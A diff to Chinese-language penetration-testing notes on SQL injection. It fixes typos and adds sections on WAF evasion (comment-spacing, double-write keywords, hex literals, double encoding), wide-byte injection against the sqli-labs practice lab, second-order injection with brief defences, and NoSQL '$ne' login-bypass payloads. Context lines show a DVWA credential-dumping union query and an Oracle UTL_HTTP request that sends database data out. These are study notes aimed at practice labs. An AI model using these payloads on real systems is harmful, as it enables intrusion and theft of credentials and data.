@@ -13,7 +13,7 @@ outline: deep
 
 [Advanced SQL Injection](../webapp/InjectionAttacks.md#advanced-sql-injection)
 
-SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。
+SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）。
 在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
 
 1. 对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
@@ -110,6 +110,10 @@ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传�
 ```sql
 ' union select 1,group_concat(username,':',password SEPARATOR '<br>') from dvwa.users #
 ```
+---
+
+## 读写
+
 <span style="font-size: 23px;">**通过SQL注入向靶机中读取写入**</span>
 
 [通过MySQL读写文件](../cyber/WebApplication.md#通过mysql读写文件)
@@ -229,7 +233,7 @@ sqlmap -r "post.txt" -p "id"
 ```
 ---
 
-<span style="font-size: 23px;">**通过sqlmap获取Shel**</span>
+<span style="font-size: 23px;">**通过sqlmap获取Shell**</span>
 
 - 需要知道网站的主目录，且有一个具有 **写** 权限的目录
 
@@ -561,3 +565,71 @@ select UTL_HTTP.request('http://192.168.25.166/test.php'||'?id='||(select versio
 [Filter Evasion Techniques](../webapp/InjectionAttacks.md#filter-evasion-techniques)
 
 普通的注入方式过于明显，很容易被检测。因此，需要改变攻击的手法，绕过检测和过滤，即**混淆和绕过**。具体操作针对于服务端和WAF的防御机制有多种手段。
+
+### 不常用绕过
+
+<span style="font-size: 19px;">**group by 绕过**</span>
+
+```sql
+select substr((select GROUP_CONCAT(name) as names from test), 1, 5);
+```
+<span style="font-size: 19px;">**select 及单引号过滤绕过**</span>
+
+```sql
+select * from test where id = 1 || substr(name,1,1) = 't';
+select * from test where id = 1 || substr(name,1,1) = 0x74;
+select *, binary(name) from test where id = 1 && binary(name) > 0x74;
+```
+<span style="font-size: 19px;">**空格、等号过滤绕过**</span>
+
+```sql
+select/**/*/**/from/**/test/**/where/**/id/**/like/**/1;
+```
+<span style="font-size: 19px;">**双写绕过**</span>
+
+*bwapp_sql_injection(GET/Select)*
+```sql
+http://127.0.0.1:80/sqli_2.php?movie=13 ununionion select 1,user(),user(),4,5,6,7 from information_schema.tables &action=go
+```
+<span style="font-size: 19px;">**双重编码绕过|**</span>
+
+**过滤代码**: WAF：urldecode(param)->过滤
+
+<img src="./assets/双重编码绕过.png" alt="background" width="433" >
+
+### 宽字节注入
+
+<span style="font-size: 19px;">**逃逸绕过转义函数（宽字节注入）**</span>
+
+*sqli-labs_less-36*
+```sql
+/Less-36/?id=133 %df%27 union select 1,user(),3 %23
+```
+![宽字节注入](assets/宽字节注入.png)
+
+---
+
+## 二次注入
+
+![双重编码绕过](assets/二次注入.png)
+
+**防御方式**
+
+- 预编译
+- 禁止用户账号出现特殊符号
+
+---
+
+## NoSQL注入
+
+[nosql-injection](../webapp/InjectionAttacks.md#nosql-injection)
+
+**paylaod**
+
+```bash
+user[$ne]=attacker&pass[$ne]=pas123
+```
+
+```bash
+';return key;//
+```
